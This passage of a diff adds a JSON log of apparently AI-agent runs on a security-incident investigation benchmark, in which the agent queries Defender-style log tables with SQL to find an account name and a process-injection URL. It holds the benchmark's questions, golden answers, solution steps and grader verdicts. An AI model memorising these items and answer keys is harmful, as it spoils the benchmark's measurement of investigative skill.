('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',), ('vnevado-win11a.vnevado.alpineskihouse.co',)]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT DISTINCT ActionType FROM DeviceProcessEvents WHERE DeviceName = 'vnevado-win11a.vnevado.alpineskihouse.co'",
+                "observation": "[('ProcessCreated',)]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT InitiatingProcessAccountName, AccountName FROM DeviceProcessEvents WHERE DeviceName = 'vnevado-win11a.vnevado.alpineskihouse.co' AND FileName = 'notepad.exe' AND ProcessId = 8932",
+                "observation": "[('nathans', 'nathans')]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "nathans",
+                "observation": "",
+                "reward": 1,
+                "done": true,
+                "info": {
+                    "check_ans_response": "Analysis: The submitted answer matches the golden answer exactly, providing the correct name of the account associated with the suspicious activity.  \nIs_Answer_Correct: True",
+                    "reward": 1,
+                    "check_ans_reflection": "Reflection: The previous evaluation is accurate since the submitted answer matches the golden answer exactly, as required.\n\nAnalysis: The submitted answer \"nathans\" is identical to the golden answer \"nathans\" and pertains directly to the name of the account involved in the suspicious activity. There is no discrepancy or additional irrelevant information.\n\nIs_Answer_Correct: True",
+                    "submitted_answer": "nathans",
+                    "query_success": true,
+                    "submit": true
+                }
+            }
+        ]
+    },
+    {
+        "success": true,
+        "steps": 15,
+        "reward": 1,
+        "success_query_count": 13,
+        "total_query_count": 14,
+        "question": {
+            "context": "A security incident where unexpected behavior was observed in a process that ran with no command line arguments on IP address `202.183.149.174`. This kind of behavior can indicate code injection or a malicious execution masquerading as a legitimate process. As part of the investigation into this incident, it was reported that a process demonstrated suspicious activities such as injecting code into another, leading to abnormal behaviors like opening a listening port or connecting to a command control server.",
+            "question": "Related to this alert, can you identify the URL associated with the suspicious process injection?",
+            "answer": "https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/winatp-intro-fileless.txt",
+            "solution": [
+                "Unexpected behavior was observed by a process on host `vnevado-win11a`, which was ran with no command line arguments.",
+                "A suspicious process injection has been observed, where code was injected using the URL `https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/winatp-intro-fileless.txt`."
+            ],
+            "start_alert": 15,
+            "end_alert": 10,
+            "start_entities": [
+                16
+            ],
+            "end_entities": [
+                13
+            ],
+            "shortest_alert_path": [
+                15,
+                8,
+                10
+            ]
+        },
+        "trajectory": [
+            {
+                "action": "DESCRIBE processes",
+                "observation": "ProgrammingError: Table 'env_monitor_db.processes' doesn't exist",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": false,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SHOW TABLES",
+                "observation": "[('AADManagedIdentitySignInLogs',), ('AADNonInteractiveUserSignInLogs',), ('AADServicePrincipalSignInLogs',), ('AZFWApplicationRule',), ('AZFWApplicationRuleAggregation',), ('AZFWDnsQuery',), ('AZFWIdpsSignature',), ('AZFWNetworkRule',), ('AZFWNetworkRuleAggregation',), ('AlertEvidence',), ('AlertInfo',), ('AuditLogs',), ('AzureMetrics',), ('CloudAppEvents',), ('DeviceEvents',), ('DeviceFileCertificateInfo',), ('DeviceFileEvents',), ('DeviceImageLoadEvents',), ('DeviceInfo',), ('DeviceLogonEvents',), ('DeviceNetworkEvents',), ('DeviceNetworkInfo',), ('DeviceProcessEvents',), ('DeviceRegistryEvents',), ('EmailAttachmentInfo',), ('EmailEvents',), ('EmailUrlInfo',), ('Heartbeat',), ('IdentityDirectoryEvents',), ('IdentityLogonEvents',), ('IdentityQueryEvents',), ('MicrosoftAzureBastionAuditLogs',), ('MicrosoftGraphActivityLogs',), ('SecurityAlert',), ('SecurityIncident',), ('SigninLogs',), ('ThreatIntelligenceIndicator',), ('Usage',)]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "DESCRIBE DeviceProcessEvents",
+                "observation": "[('TenantId', 'text', 'YES', '', None, ''), ('AccountDomain', 'text', 'YES', '', None, ''), ('AccountName', 'text', 'YES', '', None, ''), ('AccountObjectId', 'text', 'YES', '', None, ''), ('AccountSid', 'text', 'YES', '', None, ''), ('AccountUpn', 'text', 'YES', '', None, ''), ('ActionType', 'text', 'YES', '', None, ''), ('AdditionalFields', 'text', 'YES', '', None, ''), ('AppGuardContainerId', 'text', 'YES', '', None, ''), ('DeviceId', 'text', 'YES', '', None, ''), ('DeviceName', 'text', 'YES', '', None, ''), ('FileName', 'text', 'YES', '', None, ''), ('FolderPath', 'text', 'YES', '', None, ''), ('FileSize', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountDomain', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountName', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountObjectId', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountSid', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountUpn', 'text', 'YES', '', None, ''), ('InitiatingProcessCommandLine', 'text', 'YES', '', None, ''), ('InitiatingProcessFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessFolderPath', 'text', 'YES', '', None, ''), ('InitiatingProcessId', 'text', 'YES', '', None, ''), ('InitiatingProcessIntegrityLevel', 'text', 'YES', '', None, ''), ('InitiatingProcessLogonId', 'text', 'YES', '', None, ''), ('InitiatingProcessMD5', 'text', 'YES', '', None, ''), ('InitiatingProcessParentFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessParentId', 'text', 'YES', '', None, ''), ('InitiatingProcessSHA1', 'text', 'YES', '', None, ''), ('InitiatingProcessSHA256', 'text', 'YES', '', None, ''), ('InitiatingProcessTokenElevation', 'text', 'YES', '', None, ''), ('InitiatingProcessFileSize', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoCompanyName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoProductName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoProductVersion', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoInternalFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoOriginalFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoFileDescription', 'text', 'YES', '', None, ''), ('LogonId', 'text', 'YES', '', None, ''), ('MD5', 'text', 'YES', '', None, ''), ('MachineGroup', 'text', 'YES', '', None, ''), ('ProcessCommandLine', 'text', 'YES', '', None, ''), ('ProcessCreationTime', 'text', 'YES', '', None, ''), ('ProcessId', 'text', 'YES', '', None, ''), ('ProcessIntegrityLevel', 'text', 'YES', '', None, ''), ('ProcessTokenElevation', 'text', 'YES', '', None, ''), ('ProcessVersionInfoCompanyName', 'text', 'YES', '', None, ''), ('ProcessVersionInfoProductName', 'text', 'YES', '', None, ''), ('ProcessVersionInfoProductVersion', 'text', 'YES', '', None, ''), ('ProcessVersionInfoInternalFileName', 'text', 'YES', '', None, ''), ('ProcessVersionInfoOriginalFileName', 'text', 'YES', '', None, ''), ('ProcessVersionInfoFileDescription', 'text', 'YES', '', None, ''), ('InitiatingProcessSignerType', 'text', 'YES', '', None, ''), ('InitiatingProcessSignatureStatus', 'text', 'YES', '', None, ''), ('ReportId', 'text', 'YES', '', None, ''), ('SHA1', 'text', 'YES', '', None, ''), ('SHA256', 'text', 'YES', '', None, ''), ('TimeGenerated', 'text', 'YES', '', None, ''), ('Timestamp', 'text', 'YES', '', None, ''), ('InitiatingProcessParentCreationTime', 'text', 'YES', '', None, ''), ('InitiatingProcessCreationTime', 'text', 'YES', '', None, ''), ('SourceSystem', 'text', 'YES', '', None, ''), ('Type', 'text', 'YES', '', None, '')]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "DESCRIBE DeviceNetworkEvents",
+                "observation": "[('TenantId', 'text', 'YES', '', None, ''), ('ActionType', 'text', 'YES', '', None, ''), ('AdditionalFields', 'text', 'YES', '', None, ''), ('AppGuardContainerId', 'text', 'YES', '', None, ''), ('DeviceId', 'text', 'YES', '', None, ''), ('DeviceName', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountDomain', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountName', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountObjectId', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountSid', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountUpn', 'text', 'YES', '', None, ''), ('InitiatingProcessCommandLine', 'text', 'YES', '', None, ''), ('InitiatingProcessFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessFolderPath', 'text', 'YES', '', None, ''), ('InitiatingProcessId', 'text', 'YES', '', None, ''), ('InitiatingProcessIntegrityLevel', 'text', 'YES', '', None, ''), ('InitiatingProcessMD5', 'text', 'YES', '', None, ''), ('InitiatingProcessParentFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessParentId', 'text', 'YES', '', None, ''), ('InitiatingProcessSHA1', 'text', 'YES', '', None, ''), ('InitiatingProcessSHA256', 'text', 'YES', '', None, ''), ('InitiatingProcessTokenElevation', 'text', 'YES', '', None, ''), ('InitiatingProcessFileSize', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoCompanyName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoProductName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoProductVersion', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoInternalFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoOriginalFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoFileDescription', 'text', 'YES', '', None, ''), ('LocalIP', 'text', 'YES', '', None, ''), ('LocalIPType', 'text', 'YES', '', None, ''), ('LocalPort', 'text', 'YES', '', None, ''), ('MachineGroup', 'text', 'YES', '', None, ''), ('Protocol', 'text', 'YES', '', None, ''), ('RemoteIP', 'text', 'YES', '', None, ''), ('RemoteIPType', 'text', 'YES', '', None, ''), ('RemotePort', 'text', 'YES', '', None, ''), ('RemoteUrl', 'text', 'YES', '', None, ''), ('ReportId', 'text', 'YES', '', None, ''), ('TimeGenerated', 'text', 'YES', '', None, ''), ('Timestamp', 'text', 'YES', '', None, ''), ('InitiatingProcessParentCreationTime', 'text', 'YES', '', None, ''), ('InitiatingProcessCreationTime', 'text', 'YES', '', None, ''), ('SourceSystem', 'text', 'YES', '', None, ''), ('Type', 'text', 'YES', '', None, '')]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT RemoteUrl, InitiatingProcessId FROM DeviceNetworkEvents WHERE LocalIP = '202.183.149.174' AND RemoteUrl IS NOT NULL",
+                "observation": "[('', '0')]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "DESCRIBE DeviceNetworkInfo",
+                "observation": "[('TenantId', 'text', 'YES', '', None, ''), ('ConnectedNetworks', 'text', 'YES', '', None, ''), ('DefaultGateways', 'text', 'YES', '', None, ''), ('DeviceId', 'text', 'YES', '', None, ''), ('DeviceName', 'text', 'YES', '', None, ''), ('DnsAddresses', 'text', 'YES', '', None, ''), ('IPAddresses', 'text', 'YES', '', None, ''), ('IPv4Dhcp', 'text', 'YES', '', None, ''), ('IPv6Dhcp', 'text', 'YES', '', None, ''), ('MacAddress', 'text', 'YES', '', None, ''), ('MachineGroup', 'text', 'YES', '', None, ''), ('NetworkAdapterName', 'text', 'YES', '', None, ''), ('NetworkAdapterStatus', 'text', 'YES', '', None, ''), ('NetworkAdapterType', 'text', 'YES', '', None, ''), ('ReportId', 'text', 'YES', '', None, ''), ('TimeGenerated', 'text', 'YES', '', None, ''), ('Timestamp', 'text', 'YES', '', None, ''), ('TunnelType', 'text', 'YES', '', None, ''), ('NetworkAdapterVendor', 'text', 'YES', '', None, ''), ('SourceSystem', 'text', 'YES', '', None, ''), ('Type', 'text', 'YES', '', None, '')]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT DeviceId FROM DeviceNetworkInfo WHERE IPAddresses LIKE '%202.183.149.174%'",
+                "observation": "[]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "DESCRIBE DeviceInfo",
+                "observation": "[('TenantId', 'text', 'YES', '', None, ''), ('AdditionalFields', 'text', 'YES', '', None, ''), ('ClientVersion', 'text', 'YES', '', None, ''), ('DeviceId', 'text', 'YES', '', None, ''), ('DeviceName', 'text', 'YES', '', None, ''), ('DeviceObjectId', 'text', 'YES', '', None, ''), ('IsAzureADJoined', 'text', 'YES', '', None, ''), ('LoggedOnUsers', 'text', 'YES', '', None, ''), ('MachineGroup', 'text', 'YES', '', None, ''), ('OSArchitecture', 'text', 'YES', '', None, ''), ('OSBuild', 'text', 'YES', '', None, ''), ('OSPlatform', 'text', 'YES', '', None, ''), ('OSVersion', 'text', 'YES', '', None, ''), ('PublicIP', 'text', 'YES', '', None, ''), ('RegistryDeviceTag', 'text', 'YES', '', None, ''), ('ReportId', 'text', 'YES', '', None, ''), ('TimeGenerated', 'text', 'YES', '', None, ''), ('Timestamp', 'text', 'YES', '', None, ''), ('AadDeviceId', 'text', 'YES', '', None, ''), ('DeviceCategory', 'text', 'YES', '', None, ''), ('DeviceSubtype', 'text', 'YES', '', None, ''), ('DeviceType', 'text', 'YES', '', None, ''), ('JoinType', 'text', 'YES', '', None, ''), ('MergedDeviceIds', 'text', 'YES', '', None, ''), ('MergedToDeviceId', 'text', 'YES', '', None, ''), ('Model', 'text', 'YES', '', None, ''), ('OnboardingStatus', 'text', 'YES', '', None, ''), ('OSDistribution', 'text', 'YES', '', None, ''), ('OSVersionInfo', 'text', 'YES', '', None, ''), ('Vendor', 'text', 'YES', '', None, ''), ('SensorHealthState', 'text', 'YES', '', None, ''), ('IsExcluded', 'text', 'YES', '', None, ''), ('ExclusionReason', 'text', 'YES', '', None, ''), ('AssetValue', 'text', 'YES', '', None, ''), ('ExposureLevel', 'text', 'YES', '', None, ''), ('IsInternetFacing', 'text', 'YES', '', None, ''), ('SourceSystem', 'text', 'YES', '', None, ''), ('Type', 'text', 'YES', '', None, '')]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT DeviceId FROM DeviceInfo WHERE PublicIP = '202.183.149.174'",
+                "observation": "[]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT DeviceId FROM DeviceNetworkEvents WHERE LocalIP = '202.183.149.174' LIMIT 1",
+                "observation": "[('ea4d0f6828d838027701d6a85a2408c9317ad687',)]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
